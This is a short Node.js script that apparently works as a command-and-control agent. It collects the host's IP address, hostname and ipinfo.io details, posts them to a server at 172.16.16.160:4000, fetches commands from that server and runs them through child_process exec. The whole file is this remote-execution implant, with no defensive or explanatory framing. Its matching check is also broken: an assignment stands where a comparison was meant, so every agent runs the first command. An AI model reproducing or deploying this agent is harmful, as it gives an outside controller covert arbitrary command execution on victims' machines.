const request = require('request');
let os = require("os");
let ip = require("ip");
let exec = require('child_process').exec;


var myip = ip.address()

//console.log(myip);

const host_name =  os.hostname();
const myaddr = myip + "@" + host_name;


const ipinfo = {
    url: 'http://ipinfo.io',
    method: 'GET',
   
};

const getcommand = {
    url: 'http://172.16.16.160:4000/getcommand',
    method: 'GET',
   
};

	request(ipinfo, function(err, res, body) {

		if (err){ console.log(err)}
		else {
			ipinfo_res = JSON.parse(body)
            ipinfo_res['agent_name']=myaddr;
            ipinfo_res['agentActive']=1;
			console.log(ipinfo_res)
			console.log(ipinfo_res.ip);
	
			const options = {
				url: 'http://172.16.16.160:4000/agentdetails',
                method: 'POST',
                headers :{
                    accept: '*/*',
                    'content-type' : 'application/json'
                },
                body: ipinfo_res, 
                json :true
                
			   
			};
	
			request(options,function(err,res,body){
                console.log("Error:" + err)
                console.log("Response:"  +res)
                console.log("Body:"  +body)
            })

            request(getcommand,function(err,res,body){
               if(err){
                   console.log(err)
               }else{
                   execute = JSON.parse(body)
                   console.log(body)
                   console.log("command is " + execute[0].command);
                   
                   execute.forEach(i=>{
                    if (i.agent_name = myaddr){
                        exec(execute[0].command, function(err, stdout, stderr) 
                       {if (err)
                                {console.log(stderr);}
                       else 
                                {console.log(stdout);}});
                    }
                  })

                   
               }
            })
	
		}
	});

